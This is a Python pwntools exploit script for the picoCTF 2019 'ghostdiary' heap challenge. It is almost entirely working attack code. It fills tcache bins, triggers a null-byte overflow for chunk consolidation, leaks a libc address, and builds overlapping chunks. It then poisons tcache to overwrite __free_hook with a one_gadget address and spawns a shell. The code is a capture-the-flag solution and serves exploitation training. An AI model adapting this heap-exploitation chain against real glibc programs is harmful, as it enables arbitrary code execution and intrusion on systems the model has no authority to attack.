#####################################
# picoo CTF 2019 - ghostdiary challenge 
# written by: Omer Shalev (vook)
#October 2019 
####################################

from pwn import *
#context.terminal = ['tmux', 'splitw', '-v']
r = process("/problems/ghost-diary_0_3fe5c3d8597f5f041d53fd64c0d577d2/ghostdiary")



def sync_with_menu():
    r.recvuntil(">")

def big_chunk_allocate(size):
    r.sendline("1")
    r.recvuntil(">")
    r.sendline("2") #write on both sides
    r.recvuntil("size: ")
    r.sendline(size) #0x1E0
    r.recvuntil("#")
    page  = r.recvline()[:1]
    #print "Page %s (big)" % page
    sync_with_menu()

    return page

def small_chunk_allocate(size):
    r.sendline("1")
    r.recvuntil(">")
    r.sendline("1") #write on one side
    r.recvuntil("size: ")
    r.sendline(size) #
    r.recvuntil("#")
    page  = r.recvline()[:1]
    #print "Page %s (small)" % page
    sync_with_menu()
    return page

def free_chunk(page):
    r.sendline("4")#option 4 is burn
    r.recvuntil("Page: ")
    r.sendline(page)
    sync_with_menu()

tcache1 = [None]*10
tcache2 = [None]*10
sync_with_menu() #lets get started!

a =big_chunk_allocate("472")
b = big_chunk_allocate("472")
c = small_chunk_allocate("240")
#gdb.attach(r)


print  "[+]First stage accomplished"
#fill out 0x1e0 tcache bin

for i in range(7):
    tcache1[i]  = big_chunk_allocate("472")
for i in range(7):
    free_chunk(tcache1[i])
for i in range(7):
    tcache2[i]  = small_chunk_allocate("240")
for i in range(7):
    free_chunk(tcache2[i])

print  "[+]Second stage accomplished"

#now when we free chunk a it will got straight to an unsorted bin
free_chunk(a)

print  "[+]chunk a got freed successfully"
print  "[+]Overflowing"
r.sendline("2")
r.sendline(b)
r.sendline(0x1d0 * "B" + p64(0x3c0)) #overflow a null byte in the end of chunk c


sync_with_menu()


free_chunk(c)   #expected a consolidation of a/b/c



print  "[+]Freed chunk c"



#Now make the big tcache bin empty
for i in range(7):
   tcache1[i]  = big_chunk_allocate("472")

print  "[+]Make 0x1e0 tcache empty"

#allocating a new tcache size chunk
A = big_chunk_allocate("472")


#now print b's data

r.sendline("3")
r.recvuntil("Page:")
r.sendline(b)
ref = r.recvline()
s = ref[::-1]
sup =  "".join("{:02x}".format(ord(c)) for c in s[1:7])
print "[+] Leaked a libc adress %s "% sup
leaked = int(sup , 16)

libc_base = leaked - 0x3ebca0
free_hook = libc_base + 0x3ed8e8
one_gadget = libc_base + 0x04F322
print "libc base = "+hex(libc_base)
print "free hook = "+hex(free_hook)
print "one gadget = "+hex(one_gadget)


B = big_chunk_allocate("472") #it will get a chunk hopefully from the unsorted bin , overlapping with b


r.sendline("3")
r.recvuntil("Page:")
r.sendline(B)
ref = r.recvline()

r.sendline("3")
r.recvuntil("Page:")
r.sendline(b)
ref1 = r.recvline()


if ref == ref1:
    print "[+]Managed to get overlapping chunks"
else:
    print "[-]Couldnt make overlapping chunks"

free_chunk(B)
free_chunk(b)

#gdb.attach(r)

b = big_chunk_allocate("472")

r.sendline("2")
r.sendline(b)
r.sendline(p64(free_hook) + "bbbbbbbb")

sync_with_menu()


irr = big_chunk_allocate("472")



give_shell = big_chunk_allocate("472")

print "[+] our &_free_hook is at %s" % give_shell

r.sendline("2")
r.sendline("10")
r.sendline(p64(one_gadget))

#gdb.attach(r)


'''Calling the overitten _free_hook , and spawn a shell '''
free_chunk(b)

r.interactive() 

